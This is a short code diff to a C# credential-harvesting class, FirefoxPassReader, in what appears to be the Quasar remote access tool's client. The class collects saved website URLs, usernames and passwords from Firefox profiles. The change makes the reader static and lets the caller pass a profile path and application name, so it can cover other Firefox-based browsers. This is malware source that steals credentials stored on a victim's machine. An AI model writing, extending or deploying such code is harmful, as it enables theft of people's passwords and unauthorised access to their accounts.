@@ -8,15 +8,13 @@ using System.Runtime.Serialization;
 
 namespace Quasar.Client.Recovery.Browsers
 {
-    public class FirefoxPassReader : IAccountReader
+    public class FirefoxPassReader
     {
-        /// <inheritdoc />
-        public string ApplicationName => "Firefox";
 
         /// <inheritdoc />
-        public IEnumerable<RecoveredAccount> ReadAccounts()
+        public static List<RecoveredAccount> ReadAccounts(string profiles, string name)
         {
-            string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
+            string[] dirs = Directory.GetDirectories(profiles);
 
             var logins = new List<RecoveredAccount>();
             if (dirs.Length == 0)
@@ -83,7 +81,7 @@ namespace Quasar.Client.Recovery.Browsers
                                             Url = host,
                                             Username = user,
                                             Password = pass,
-                                            Application = ApplicationName
+                                            Application = name
                                         });
                                     }
                                 }
@@ -111,7 +109,7 @@ namespace Quasar.Client.Recovery.Browsers
                                     Username = username,
                                     Password = password,
                                     Url = loginData.Hostname.ToString(),
-                                    Application = ApplicationName
+                                    Application = name
                                 });
                             }
                         }
